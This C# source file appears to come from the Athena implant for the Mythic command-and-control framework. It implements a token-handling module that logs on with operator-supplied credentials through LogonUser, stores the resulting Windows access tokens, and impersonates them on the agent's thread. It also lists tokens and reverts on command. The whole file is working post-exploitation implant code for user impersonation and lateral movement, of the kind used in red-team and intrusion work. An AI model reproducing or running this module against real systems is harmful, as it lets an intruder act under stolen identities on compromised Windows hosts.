#if DEBUG
#define WINBUILD
#endif

#if WINBUILD
using Athena.Models.Mythic.Tasks;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security.Principal;
using Microsoft.Win32.SafeHandles;
using System.Collections;
using System.Runtime.InteropServices;
using Athena.Models.Athena.Commands;
using Athena.Utilities;
using PluginBase;
using Newtonsoft.Json;

namespace Athena.Commands
{
    public class TokenHandler
    {
        static Dictionary<string, SafeAccessTokenHandle> tokens = new Dictionary<string, SafeAccessTokenHandle>();
        static string impersonatedUser = "";

        public async Task<object> CreateToken(MythicJob job)
        {
            CreateToken tokenOptions = JsonConvert.DeserializeObject<CreateToken>(job.task.parameters);
            SafeAccessTokenHandle hToken = new SafeAccessTokenHandle();
            try
            {
                if (Pinvoke.LogonUser(
                    tokenOptions.username,
                    tokenOptions.domain,
                    tokenOptions.password,
                    tokenOptions.netOnly ? Pinvoke.LogonType.LOGON32_LOGON_NETWORK : Pinvoke.LogonType.LOGON32_LOGON_INTERACTIVE,
                    Pinvoke.LogonProvider.LOGON32_PROVIDER_DEFAULT,
                    out hToken
                    ))
                {
                    tokens.Add(tokenOptions.name, hToken);

                    return new ResponseResult()
                    {
                        user_output = $"Token created for {tokenOptions.username}",
                        status = "success",
                        completed = "true",
                        task_id = job.task.id,
                    };
                }
                else
                {
                    return new ResponseResult()
                    {
                        user_output = $"Failed to create token: {Marshal.GetLastWin32Error()}",
                        status = "success",
                        completed = "true",
                        task_id = job.task.id,
                    };
                }

            }
            catch (Exception e)
            {
                return new ResponseResult()
                {
                    user_output = $"Failed to create token: {e.ToString()}",
                    status = "errored",
                    completed = "true",
                    task_id = job.task.id,
                };
            }
        }
        public async Task<bool> ThreadImpersonate()
        {
            if (!String.IsNullOrEmpty(impersonatedUser))
            {
                return Pinvoke.ImpersonateLoggedOnUser(tokens[impersonatedUser]);
            }
            return true; //No impesronation to do so just return
        }
        public async Task<object> ThreadRevert()
        {
            return Pinvoke.RevertToSelf();
        }
        public async Task<object> SetToken(MythicJob job)
        {
            if (tokens.ContainsKey(job.task.parameters))
            {
                impersonatedUser = job.task.parameters;
                return new ResponseResult()
                {
                    user_output = $"Token set to {job.task.parameters}",
                    status = "success",
                    completed = "true",
                    task_id = job.task.id,
                };
            }

            return new ResponseResult()
            {
                user_output = $"No token with name: {job.task.parameters}",
                status = "errored",
                completed = "true",
                task_id = job.task.id,
            };
        }
        public async Task<object> RevertToSelf(MythicJob job)
        {
            impersonatedUser = "";

            return new ResponseResult()
            {
                user_output = $"Token reverted",
                status = "success",
                completed = "true",
                task_id = job.task.id,
            };
        }
        public async Task<object> ListTokens(MythicJob job)
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("Tokens:");
            sb.AppendLine("------------------------------");
            foreach (var token in tokens)
            {
                if (token.Key == impersonatedUser)
                {
                    sb.AppendFormat($"{token.Key} (Current)").AppendLine();

                }
                else
                {
                    sb.AppendFormat($"{token.Key}").AppendLine();

                }
            }

            return new ResponseResult()
            {
                completed = "true",
                status = "success",
                user_output = sb.ToString(),
                task_id = job.task.id,
            };
        }
    }
}
#endif
